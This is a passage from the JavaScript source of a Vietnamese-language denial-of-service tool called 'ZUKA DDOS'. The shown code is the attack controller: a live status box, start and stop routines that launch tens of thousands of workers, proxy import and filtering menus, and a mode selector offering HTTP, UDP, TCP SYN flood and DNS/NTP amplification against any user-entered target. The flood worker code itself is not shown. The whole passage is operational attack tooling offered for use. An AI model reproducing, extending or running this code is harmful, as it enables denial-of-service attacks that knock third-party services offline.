    const remaining = Math.max(0, CONFIG.duration - elapsed);
    const progress = Math.min(100, (elapsed / CONFIG.duration) * 100);
    const targetSpeed = CONFIG.rate || ENV.recommendedRate;
    const speedPercent = Math.min(100, (speed / targetSpeed) * 100);
    
    const resources = getSystemResources();
    const cpuPercent = (resources.cpuUsage * 100).toFixed(1);
    const memPercent = (resources.memUsage * 100).toFixed(1);
    const adjusted = (adaptiveAdjustment * 100).toFixed(0);
    
    const barWidth = 30;
    const filled = Math.floor((progress / 100) * barWidth);
    const bar = '[' + '='.repeat(filled) + '>'.repeat(filled < barWidth ? 1 : 0) + ' '.repeat(Math.max(0, barWidth - filled - (filled < barWidth ? 1 : 0))) + ']';
    
    const speedBar = '[' + '='.repeat(Math.floor(speedPercent / 5)) + ' '.repeat(Math.max(0, 20 - Math.floor(speedPercent / 5))) + ']';
    
    const topMethod = Object.entries(methodScores).sort((a, b) => b[1] - a[1])[0] || ['...', 0];
    const proxyStats = getProxyStats();
    const achievedPercent = Math.min(100, (speed / targetSpeed) * 100);
    const activeWorkers = workers.length;
    const optimalWorkers = getOptimalWorkerCount();
    
    const lines = [];
    const width = 70;
    
    lines.push('+' + '-'.repeat(width - 2) + '+');
    lines.push('|' + ' ' + 'TRANG THAI TAN CONG - ' + (ENV.isMobile ? 'MOBILE' : 'PC').padEnd(width - 3) + '|');
    lines.push('+' + '-'.repeat(width - 2) + '+');
    lines.push('| ' + bar + ' ' + progress.toFixed(1) + '%  ' + remaining.toFixed(0) + 's'.padEnd(width - 38) + '|');
    lines.push('| ' + speedBar + ' Toc do: ' + speed.toFixed(0) + '/' + targetSpeed.toLocaleString() + ' req/s'.padEnd(width - 25) + '|');
    lines.push('| ' + 'Tong: '.padEnd(8) + totalRequests.toLocaleString().padEnd(15) + 
               'Thanh cong: '.padEnd(12) + successRequests.toLocaleString().padEnd(15) + '|');
    lines.push('| ' + 'Du lieu: '.padEnd(8) + mb + ' MB'.padEnd(15) + 
               'Ty le: '.padEnd(12) + rate + '%'.padEnd(15) + '|');
    lines.push('| ' + 'Peak: '.padEnd(8) + peakSpeed.toFixed(0) + ' req/s'.padEnd(15) + 
               'Proxy: '.padEnd(12) + proxyStats.working + '/' + proxyStats.total + '|');
    lines.push('| ' + 'CPU: ' + cpuPercent + '%  RAM: ' + memPercent + '%  Adjust: ' + adjusted + '%'.padEnd(width - 36) + '|');
    lines.push('| ' + 'Workers: ' + activeWorkers + '/' + optimalWorkers + '  Batch: ' + (CONFIG.batchSize || ENV.recommendedBatchSize) + ''.padEnd(width - 44) + '|');
    lines.push('+' + '-'.repeat(width - 2) + '+');
    
    if (statusBox.visible && statusBox.lines.length > 0) {
        process.stdout.write('\x1b[' + statusBox.lines.length + 'A');
        for (let i = 0; i < statusBox.lines.length; i++) {
            process.stdout.write('\x1b[2K');
            if (i < statusBox.lines.length - 1) process.stdout.write('\n');
        }
        process.stdout.write('\x1b[' + statusBox.lines.length + 'A');
    }
    
    for (const line of lines) {
        process.stdout.write('\x1b[2K' + line + '\n');
    }
    statusBox.lines = lines;
    statusBox.lastUpdate = Date.now();
}

function startAttack() {
    return new Promise((resolve) => {
        if (running) {
            logWarn('Tan cong dang chay');
            resolve();
            return;
        }
        
        if (!CONFIG.target) {
            logError('Chua co muc tieu');
            resolve();
            return;
        }
        
        const parsed = parseTarget(CONFIG.target);
        if (!parsed || !parsed.hostname) {
            logError('Muc tieu khong hop le');
            resolve();
            return;
        }
        
        CONFIG.targetHost = parsed.hostname;
        CONFIG.targetPort = parsed.port || 80;
        CONFIG.targetSSL = parsed.protocol === 'https:';
        
        if (CONFIG.useProxy && proxyPool.length === 0) {
            CONFIG.useProxy = false;
        }
        
        console.clear();
        console.log('+' + '='.repeat(70) + '+');
        console.log('|' + ' ' + 'BAT DAU TAN CONG - ' + (ENV.isMobile ? 'MOBILE' : 'PC') + ' MODE'.padEnd(67) + '|');
        console.log('+' + '='.repeat(70) + '+');
        console.log('| ' + 'Muc tieu   : ' + parsed.hostname + ':' + CONFIG.targetPort + ' '.repeat(40) + '|');
        console.log('| ' + 'Luong      : ' + CONFIG.threads + ' '.repeat(50) + '|');
        console.log('| ' + 'Thoi gian  : ' + CONFIG.duration + 's'.padEnd(50) + '|');
        console.log('| ' + 'Che do     : ' + CONFIG.attackMode.toUpperCase() + ' '.repeat(46) + '|');
        console.log('| ' + 'Proxy      : ' + (CONFIG.useProxy ? 'BAT (' + proxyPool.length + ' proxies)' : 'TAT').padEnd(50) + '|');
        console.log('| ' + 'Toc do     : ' + (CONFIG.rate || ENV.recommendedRate).toLocaleString() + ' req/s'.padEnd(40) + '|');
        console.log('+' + '='.repeat(70) + '+');
        console.log('');
        
        running = true;
        forceStop = false;
        startTime = Date.now();
        totalRequests = 0;
        successRequests = 0;
        failedRequests = 0;
        totalBytes = 0;
        peakSpeed = 0;
        adaptiveAdjustment = 0;
        
        statusBox.visible = true;
        statusBox.lines = [];
        createStatusBox();
        
        const optimalWorkers = getOptimalWorkerCount();
        const actualWorkers = Math.min(optimalWorkers, ENV.maxConnections, 50000);
        
        logInfo('Khoi tao ' + actualWorkers + ' workers...');
        workers = [];
        
        for (let i = 0; i < actualWorkers; i++) {
            workers.push(optimizedWorker(i));
        }
        console.log('\n' + workers.length + ' workers da san sang');
        logInfo('Dang tan cong...');
        
        startResourceMonitor();
        
        statsInterval = setInterval(() => {
            if (running && !forceStop) {
                createStatusBox();
            }
        }, 200);
        
        setTimeout(() => {
            stopAttack();
        }, CONFIG.duration * 1000);
        
        resolve();
    });
}

function stopAttack() {
    return new Promise((resolve) => {
        if (!running) {
            resolve();
            return;
        }
        
        forceStop = true;
        running = false;
        clearInterval(statsInterval);
        stopResourceMonitor();
        
        const elapsed = (Date.now() - startTime) / 1000;
        
        if (statusBox.visible && statusBox.lines.length > 0) {
            process.stdout.write('\x1b[' + statusBox.lines.length + 'A');
            for (let i = 0; i < statusBox.lines.length; i++) {
                process.stdout.write('\x1b[2K\n');
            }
            process.stdout.write('\x1b[' + statusBox.lines.length + 'A');
            statusBox.lines = [];
        }
        
        console.log('\n' + '+' + '='.repeat(70) + '+');
        console.log('|' + ' ' + 'KET QUA TAN CONG'.padEnd(67) + '|');
        console.log('+' + '='.repeat(70) + '+');
        
        if (elapsed > 0 && totalRequests > 0) {
            const avgSpeed = totalRequests / elapsed;
            const targetSpeed = CONFIG.rate || ENV.recommendedRate;
            
            console.log('| ' + 'Tong request  : ' + totalRequests.toLocaleString().padEnd(42) + '|');
            console.log('| ' + 'Thanh cong    : ' + successRequests.toLocaleString().padEnd(42) + '|');
            console.log('| ' + 'That bai      : ' + failedRequests.toLocaleString().padEnd(42) + '|');
            console.log('| ' + 'Toc do TB     : ' + avgSpeed.toFixed(0) + ' req/s'.padEnd(42) + '|');
            console.log('| ' + 'Toc do dinh   : ' + (peakSpeed || 0).toFixed(0) + ' req/s'.padEnd(42) + '|');
            console.log('| ' + 'Du lieu       : ' + (totalBytes / 1024 / 1024).toFixed(2) + ' MB'.padEnd(42) + '|');
            console.log('| ' + 'Ty le thanh cong : ' + (successRequests / totalRequests * 100).toFixed(1) + '%'.padEnd(42) + '|');
            console.log('| ' + 'Dat duoc      : ' + Math.min(100, (avgSpeed / targetSpeed * 100)).toFixed(1) + '%'.padEnd(42) + '|');
            
            const proxyStats = getProxyStats();
            console.log('| ' + 'Proxy         : ' + proxyStats.working + '/' + proxyStats.total + ' hoat dong'.padEnd(42) + '|');
            
            const resources = getSystemResources();
            console.log('| ' + 'CPU su dung   : ' + (resources.cpuUsage * 100).toFixed(1) + '%'.padEnd(42) + '|');
            console.log('| ' + 'RAM su dung   : ' + (resources.memUsage * 100).toFixed(1) + '%'.padEnd(42) + '|');
            
            console.log('+' + '='.repeat(70) + '+');
            console.log('| ' + 'PHUONG THUC TOT NHAT:'.padEnd(67) + '|');
            const sorted = Object.entries(methodScores).sort((a, b) => b[1] - a[1]);
            for (let i = 0; i < Math.min(5, sorted.length); i++) {
                console.log('|   ' + (i + 1) + '. ' + sorted[i][0] + ': ' + sorted[i][1].toFixed(0) + '%'.padEnd(55) + '|');
            }
        }
        console.log('+' + '='.repeat(70) + '+');
        logSuccess('Tan cong da ket thuc');
        
        workers = [];
        resolve();
    });
}// ============================================================
// PHAN 8: MENU CHINH & MAIN
// ============================================================

async function pasteProxiesMenu() {
    console.clear();
    console.log('+' + '='.repeat(58) + '+');
    console.log('|' + ' ' + 'NHAP PROXY HANG LOAT'.padEnd(57) + '|');
    console.log('+' + '='.repeat(58) + '+');
    console.log('| ' + 'HUONG DAN:'.padEnd(57) + '|');
    console.log('| ' + '  1. Copy toan bo danh sach proxy'.padEnd(57) + '|');
    console.log('| ' + '  2. Paste vao day (Ctrl+V)'.padEnd(57) + '|');
    console.log('| ' + '  3. Moi proxy mot dong: ip:port'.padEnd(57) + '|');
    console.log('| ' + '  4. Go "done" de hoan tat'.padEnd(57) + '|');
    console.log('| ' + '  5. Go "cancel" de huy'.padEnd(57) + '|');
    console.log('+' + '='.repeat(58) + '+');
    console.log('| ' + 'Dinh dang: 8.215.3.250:3128'.padEnd(57) + '|');
    console.log('+' + '='.repeat(58) + '+');
    console.log('\nNhap proxy (moi dong mot proxy):\n');

    const lines = [];
    let totalLines = 0;
    
    console.log('Dang nhap proxy... (dan toan bo danh sach, sau do go "done")');
    
    while (true) {
        const line = await question('');
        const trimmed = line.trim();
        
        if (trimmed.toLowerCase() === 'done') {
            break;
        }
        if (trimmed.toLowerCase() === 'cancel') {
            console.log('Da huy nhap proxy.');
            await question('Nhan Enter de tiep tuc...');
            return;
        }
        if (trimmed === '') {
            if (lines.length > 0) break;
            continue;
        }
        
        lines.push(trimmed);
        totalLines++;
        if (totalLines % 100 === 0) {
            process.stdout.write('\rDa nhan ' + totalLines + ' dong proxy...');
        }
    }

    console.log('\n\nDa nhan ' + lines.length + ' dong proxy.');

    if (lines.length === 0) {
        console.log('Khong co proxy nao duoc them.');
        await question('Nhan Enter de tiep tuc...');
        return;
    }

    console.log('\nMau proxy (10 dau):');
    for (let i = 0; i < Math.min(10, lines.length); i++) {
        console.log('  ' + lines[i]);
    }
    if (lines.length > 10) {
        console.log('  ... va ' + (lines.length - 10) + ' proxy khac');
    }

    console.log('\nDang phan tich va them proxy...');
    const result = addManualProxies(lines.join('\n'));
    console.log('Da them ' + result.added + ' proxy, ' + result.invalid + ' khong hop le, ' + result.duplicates + ' trung lap');

    if (result.added > 0) {
        const check = await question('\nCo muon loc proxy hoat dong? (y/n, mac dinh: y): ');
        if (check.toLowerCase() !== 'n') {
            await filterAllProxiesFull();
        } else {
            for (const p of proxyPool) {
                p.working = true;
                p.score = 50;
            }
        }
        const stats = getProxyStats();
        console.log('\nTong: ' + stats.total + ' proxy, ' + stats.working + ' hoat dong');
    }

    await question('\nNhan Enter de tiep tuc...');
}

async function loadProxyFileMenu() {
    console.clear();
    console.log('--- TAI PROXY TU FILE ---');
    
    const filename = await question('Ten file (mac dinh: proxies.txt): ');
    const file = filename.trim() || 'proxies.txt';
    
    const count = await loadProxiesFromFile(file);
    if (count > 0) {
        const check = await question('Co muon loc proxy hoat dong? (y/n): ');
        if (check.toLowerCase() !== 'n') {
            await filterAllProxiesFull();
        }
        const stats = getProxyStats();
        console.log('Tong: ' + stats.total + ' proxy, ' + stats.working + ' hoat dong');
    }
    
    await question('Nhan Enter de tiep tuc...');
}

async function filterProxyMenu() {
    await filterAllProxiesFull();
    const stats = getProxyStats();
    console.log('Tong: ' + stats.total + ' proxy, ' + stats.working + ' hoat dong');
    await question('Nhan Enter de tiep tuc...');
}

async function showMenu() {
    console.clear();
    console.log('+' + '='.repeat(58) + '+');
    console.log('|' + ' ' + 'ZUKA DDOS v' + VERSION.padEnd(37) + '|');
    console.log('| ' + 'TAN CONG DA TANG - TOI UU 90% TAI NGUYEN'.padEnd(57) + '|');
    console.log('+' + '='.repeat(58) + '+');
    
    const proxyStats = getProxyStats();
    console.log('| ' + 'Muc tieu  : ' + (CONFIG.target || 'Chua cau hinh').padEnd(47) + '|');
    console.log('| ' + 'Proxy     : ' + (CONFIG.useProxy ? 'BAT' : 'TAT') + ' | ' + proxyStats.working + '/' + proxyStats.total + ' proxy'.padEnd(47) + '|');
    console.log('| ' + 'Luong     : ' + CONFIG.threads + ' | Che do: ' + CONFIG.attackMode.toUpperCase().padEnd(47) + '|');
    console.log('| ' + 'Thoi gian : ' + CONFIG.duration + 's | Toc do: ' + (CONFIG.rate || ENV.recommendedRate).toLocaleString() + ' req/s'.padEnd(47) + '|');
    console.log('| ' + 'CPU       : ' + ENV.cpuCores + ' cores | RAM: ' + ENV.totalRam.toFixed(1) + 'GB'.padEnd(47) + '|');
    console.log('+' + '='.repeat(58) + '+');
    console.log('| ' + ' [1] BAT DAU TAN CONG'.padEnd(57) + '|');
    console.log('| ' + ' [2] DUNG TAN CONG'.padEnd(57) + '|');
    console.log('| ' + ' [3] CAU HINH'.padEnd(57) + '|');
    console.log('| ' + ' [4] CHON CHE DO TAN CONG'.padEnd(57) + '|');
    console.log('| ' + ' [5] BAT/TAT PROXY'.padEnd(57) + '|');
    console.log('| ' + ' [6] NHAP PROXY (HANG LOAT)'.padEnd(57) + '|');
    console.log('| ' + ' [7] TAI PROXY TU FILE'.padEnd(57) + '|');
    console.log('| ' + ' [8] LOC PROXY'.padEnd(57) + '|');
    console.log('| ' + ' [9] THONG KE'.padEnd(57) + '|');
    console.log('| ' + ' [A] THOAT'.padEnd(57) + '|');
    console.log('+' + '='.repeat(58) + '+');
    console.log('\nHuong dan: Copy danh sach proxy va paste vao menu 6');
}

async function configureMenu() {
    console.clear();
    console.log('--- CAU HINH ---');
    
    const target = await question('Muc tieu (IP/Domain, hien tai: ' + (CONFIG.target || 'trong') + '): ');
    if (target.trim()) CONFIG.target = target.trim();
    
    const threads = await question('Luong (1-' + ENV.recommendedThreads * 2 + ', hien tai: ' + CONFIG.threads + '): ');
    const t = parseInt(threads);
    if (t > 0 && t <= ENV.recommendedThreads * 2) CONFIG.threads = t;
    
    const duration = await question('Thoi gian (giay, hien tai: ' + CONFIG.duration + '): ');
    const d = parseInt(duration);
    if (d > 0) CONFIG.duration = d;
    
    const rate = await question('Toc do muc tieu (req/s, hien tai: ' + (CONFIG.rate || ENV.recommendedRate) + '): ');
    const r = parseInt(rate);
    if (r > 0) CONFIG.rate = r;
    
    console.log('Da cap nhat cau hinh.');
    await question('Nhan Enter de tiep tuc...');
}

async function selectModeMenu() {
    console.clear();
    console.log('--- CHON CHE DO TAN CONG ---');
    console.log(' max    : TAT CA PHUONG THUC MANH - KHUYEN NGHI');
    console.log(' http   : HTTP methods (GET, POST, HEAD)');
    console.log(' udp    : UDP flood');
    console.log(' tcp    : TCP SYN flood');
    console.log(' dns    : DNS/NTP amplification');
    console.log(' all    : Tat ca phuong thuc');
    console.log('');
    
    const mode = await question('Che do (hien tai: ' + CONFIG.attackMode + '): ');
    if (mode.trim()) CONFIG.attackMode = mode.trim().toLowerCase();
    console.log('Da chon: ' + CONFIG.attackMode);
    await question('Nhan Enter de tiep tuc...');
}

async function toggleProxyMenu() {
    CONFIG.useProxy = !CONFIG.useProxy;
    console.log('Proxy: ' + (CONFIG.useProxy ? 'BAT' : 'TAT'));
    await question('Nhan Enter de tiep tuc...');
}

async function showStatsMenu() {
    console.clear();
    console.log('--- THONG KE ---');
    console.log('Tong request : ' + totalRequests.toLocaleString());
    console.log('Thanh cong   : ' + successRequests.toLocaleString());
    console.log('That bai     : ' + failedRequests.toLocaleString());
    console.log('Toc do dinh  : ' + peakSpeed.toFixed(0) + ' req/s');
    console.log('Du lieu      : ' + (totalBytes / 1024 / 1024).toFixed(2) + ' MB');
    console.log('Muc toc do   : ' + (CONFIG.rate || ENV.recommendedRate).toLocaleString() + ' req/s');
    
    const proxyStats = getProxyStats();
    console.log('\n--- PROXY ---');
    console.log('Tong         : ' + proxyStats.total);
    console.log('Hoat dong    : ' + proxyStats.working);
    console.log('Chat luong   : ' + proxyStats.avgScore + '%');
    console.log('Latency TB   : ' + proxyStats.avgLatency + 'ms');
    
    console.log('\n--- PHUONG THUC TOT NHAT ---');
    const sorted = Object.entries(methodScores).sort((a, b) => b[1] - a[1]);
    for (let i = 0; i < Math.min(10, sorted.length); i++) {
        console.log('  ' + (i + 1) + '. ' + sorted[i][0] + ': ' + sorted[i][1].toFixed(0) + '%');
    }
    
    const resources = getSystemResources();
    console.log('\n--- TAI NGUYEN ---');
    console.log('CPU su dung  : ' + (resources.cpuUsage * 100).toFixed(1) + '%');
    console.log('RAM su dung  : ' + (resources.memUsage * 100).toFixed(1) + '%');
    
    await question('\nNhan Enter de tiep tuc...');
}

async function main() {
    console.log('Khoi tao ZUKA DDOS v' + VERSION);
    console.log('Cong cu tan cong da tang - Toi uu 90% tai nguyen');
    console.log('Moi truong: ' + (ENV.isMobile ? 'MOBILE' : 'PC'));
    console.log('Tai nguyen: ' + ENV.recommendedThreads + ' threads, ' + ENV.recommendedRate.toLocaleString() + ' req/s');
    console.log('De bat dau, nhap proxy va muc tieu.\n');
    
    try {
        if (fs.existsSync('proxies.txt')) {
            const content = fs.readFileSync('proxies.txt', 'utf8');
            const lines = content.split('\n').filter(l => l.trim());
            if (lines.length > 0) {
                const result = addManualProxies(content);
                console.log('Da tai ' + result.added + ' proxy tu file proxies.txt');
                if (result.added > 0) {
                    console.log('De loc proxy, chon menu 8');
                }
            }
        }
    } catch(e) {}
    
    while (true) {
        await showMenu();
        const choice = await question('Lua chon: ');
        const c = choice.trim().toUpperCase();
        
        switch (c) {
            case '1': await startAttack(); break;
            case '2': await stopAttack(); break;
            case '3': await configureMenu(); break;
            case '4': await selectModeMenu(); break;
            case '5': await toggleProxyMenu(); break;
            case '6': await pasteProxiesMenu(); break;
            case '7': await loadProxyFileMenu(); break;
            case '8': await filterProxyMenu(); break;
            case '9': await showStatsMenu(); break;
            case 'A':
                console.log('Thoat chuong trinh.');
                rl.close();
                process.exit(0);
            default:
                console.log('Lua chon khong hop le.');
                await question('Nhan Enter de tiep tuc...');
        }
    }
}

process.on('SIGINT', () => {
    console.log('\nDang dung...');
    if (running) {
        stopAttack().then(() => {
            rl.close();
            process.exit(0);
        });
    } else {
        rl.close();
        process.exit(0);
    }
});

process.on('uncaughtException', (err) => {
    const msg = err.message || '';
    if (!msg.includes('ENOTFOUND') && !msg.includes('ECONNRESET') && 
        !msg.includes('ETIMEDOUT') && !msg.includes('EADDRNOTAVAIL') &&
        !msg.includes('ECONNREFUSED') && !msg.includes('heap')) {
        console.log('Loi: ' + msg.substring(0, 100));
    }
});

process.on('unhandledRejection', (err) => {
    const msg = err.message || '';
    if (!msg.includes('ENOTFOUND') && !msg.includes('ECONNRESET') && 
        !msg.includes('ETIMEDOUT') && !msg.includes('EADDRNOTAVAIL') &&
        !msg.includes('heap')) {
        console.log('Promise Rejection: ' + msg.substring(0, 100));
    }
});

main().catch(console.error);
